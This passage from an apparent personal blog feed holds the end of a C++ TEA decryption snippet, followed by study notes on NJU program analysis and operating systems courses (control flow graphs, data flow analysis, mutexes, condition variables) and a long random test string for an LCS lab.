class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">6</span>);</span><br><span class="line">    cout&lt;&lt;(<span class="type">char</span> *)encflag&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="xtea-decrypt">[2-1-2] xTea decrypt</h3>
<h3 id="xxtea-decrypt">[2-1-3] xxTea decrypt</h3>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>CSBasics - NJU_Program_Analysis_Note</title>
    <url>/2024/08/27/CSBasics%20-%20NJU_Program_Analysis_Note/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
记录一下上课+做实验时产生的问题、思考与收获
</blockquote>
<span id="more"></span>
<h1 id="lecture1-introduction">[1] Lecture1 Introduction</h1>
<h2 id="what-is-static-analysis">[1-1] what is Static Analysis？</h2>
<p>Static Analysis is different with dynamic analysis, analyzers need to
construct static bird's view of the whole workflows. Besides, static
analyzers usually focus on the consequence of the analysis rather than
the process.</p>
<h2 id="what-is-a-good-static-analysis">[1-2] What is a good Static
Analysis?</h2>
<p>Before introducing what is a good static analysis, we need to find
out what is 'sound' and what is 'complete'.</p>
<p>sound: We describe a result is sound when it's reasonable. When a
result is sound, its false negative is low.</p>
<p>complete: We describe a result is complete because it's definitely
correct. When a result is complete, its false positive is low.</p>
<p>And in static analysis, we usually focus on <code>soundness</code>
rather than. I think it's probably because we'd rather manually check
the result than leave any posibility away.</p>
<h2 id="rices-theory">[1-3] Rice's Theory</h2>
<p>Unfortunately, Rice has proved (maybe? I forgot) that we can't give a
<code>perfect</code> static analysis to prove non-trivial properties on
a re programming language.</p>
<h2 id="examplebirds-view-of-techniques">[1-4] Example(Bird's view of
techniques)</h2>
<h3 id="abstract">[1-4-1] Abstract</h3>
<p>1, 0, -1 respectively represent [+] ,[0] and [-]</p>
<p><code>x &lt; y ? 1 : -1</code> represents [top] which means
unknown</p>
<p><code>1 / 0</code> represents [down] which means undefined</p>
<h3 id="over-approximation">[1-4-2] Over-Approximation</h3>
<ol type="1">
<li><p>considering of condition</p></li>
<li><p>considering of control flow</p></li>
</ol>
<h1 id="lecture2-intermediate-representation">[2] Lecture2 Intermediate
Representation</h1>
<h2 id="whats-the-difference-between-compiler-static-analyzer">[2-1]
What's the difference between compiler &amp; static analyzer?</h2>
<p>Compiler: source code -(Lexical analysis)-&gt; Tokens -(Syntax
analysis)-&gt; AST -(Semantic analysis)-&gt; Decorated AST
-(Translator)-&gt; IR -(Code generator)-&gt; Binary</p>
<p>And static analyzers are usually based on IR layer.</p>
<h2 id="ac-3-address-code">[2-2] 3AC: 3-Address-Code</h2>
<p>A common form of IR is 3AC. There is only one operator at the right
side of the equation. For example:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = a + c</span><br><span class="line">q = a * p</span><br><span class="line">p = q - d</span><br></pre></td></tr></table></figure>
<h2 id="control-flow-graphcfg">[2-3] Control Flow Graph(CFG)</h2>
<p>Control Flow Graph is constructed with nodes and edges. Nodes in
graph is called Basic blocks(BB), and edges in graph is just called
edge.</p>
<h3 id="basic-blocksbb">[2-3-1] Basic Blocks(BB)</h3>
<p>properties: - BB can be entered only at the start instructions. - BB
can be ended only by jump instructions</p>
<p>construct algorithm: - Input: list of IR instructions - Output: list
of BBs - Algo: - find the leader of a block 1. startpoint of the
instruction list 2. endpoint of a jump instruction 3. sequent
instruction of a jump instrcution - break at the jump instructions</p>
<h3 id="when-should-we-add-edges">[2-3-2] When should we add edges?</h3>
<ol type="1">
<li>2 edges follow branch instruction</li>
<li>1 edge follows jump instr without condition</li>
</ol>
<h1 id="lecture3-data-flow-analysis-i-overview-applications">[3]
Lecture3 Data Flow Analysis I (Overview &amp; Applications)</h1>
<h2 id="overview-of-data-flow-analysis">[3-1] Overview of Data flow
analysis</h2>
<h3 id="what-is-data-flow-analysis">[3-1-1] what is data flow
analysis?</h3>
<p>How _ Data(Abstraction) Flow(Safe-approximation) through the _ of
CFG</p>
<p>Node: Transfer function</p>
<p>Edge: Control flow function(union the signs at merges)</p>
<h3 id="whats-the-difference-between-may-analysis-must-analysis">[3-1-2]
what's the difference between may-analysis &amp; must-analysis?</h3>
<p>may:</p>
<p>must:</p>
<h2 id="preliminaries">[3-2] Preliminaries</h2>
<h3 id="input-output-state">[3-2-1] Input &amp; Output state</h3>
<p>property 1: Every execution of an IR statement transforms</p>
<p>property 2: The Input/output state is associated with a program
point(from view of state-machine)</p>
<h2 id="symbols">[3-2-2] Symbols</h2>
<p>meet operator: ∩</p>
<h2 id="section">[3-3]</h2>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>Program Analysis</tag>
      </tags>
  </entry>
  <entry>
    <title>CSBasics - NJUOS_Note</title>
    <url>/2024/03/10/CSBasics%20-%20NJUOS_Note/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
记录一下上课+做实验时产生的问题、思考与收获
</blockquote>
<span id="more"></span>
<h1 id="m2-plcs">[M2] plcs</h1>
<ul>
<li>做完这个实验，收获概括来讲是
<ol type="1">
<li>理解计算图与依赖关系，并通过它来实现并发</li>
<li>LCS的各种<a
href="https://www.geeksforgeeks.org/longest-common-subsequence-dp-4/">实现方法</a></li>
<li>加深对互斥与同步的理解，写出第一个并发程序</li>
<li>加深对条件变量实现生产者消费者模型的理解</li>
<li>提高编程素养
<ol type="1">
<li>利用宏定义增强代码可读性</li>
<li>利用 assert 进行防御性编程</li>
<li>将大任务拆分成多个小任务</li>
</ol></li>
</ol></li>
</ul>
<h2 id="m2-1-并发编程">[M2-1] 并发编程</h2>
<ol type="1">
<li><p>任何可能被多线程修改的全局变量，都应该上锁以后再处理</p></li>
<li><p>生产者负责生产而不是消费，逻辑要对</p></li>
<li><p>在现实生活中找一些实例来帮助理解并发程序</p></li>
<li><p>并发函数 <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">pthread_mutex_lock/pthread_mutex_unlock</span><br><span class="line"><span class="comment">// 我认为这两个函数之间的代码被称作“临界区”</span></span><br><span class="line"><span class="comment">// 上锁或解锁时暂停时间，但临界区还是会被interrupt</span></span><br><span class="line"><span class="comment">// 用锁保护临界区的全局变量</span></span><br><span class="line"></span><br><span class="line">pthread_cond_wait</span><br><span class="line"><span class="comment">// 睡眠自己并释放持有的锁</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<h2 id="m2-2-实验数据">[M2-2] 实验数据</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试用例：</span><br><span class="line">dwiufhkdscnhuifhkwufherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhbwjhefwhjedbjasbwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfheonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjaswihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjaswihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryibxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjaswihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegrfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjas</span><br><span class="line"></span><br><span class="line">dnjwfhrifhiuwhcieghtughhijyiohtonyjkpuopjlpmkyojknohnmotimjoqerwsreqczdxdswdrqzfgscxfqwdeqtwfewyjhfbvkrjnhioytjkuopjkplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhlnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhritunkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcgghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyegiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkrhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqu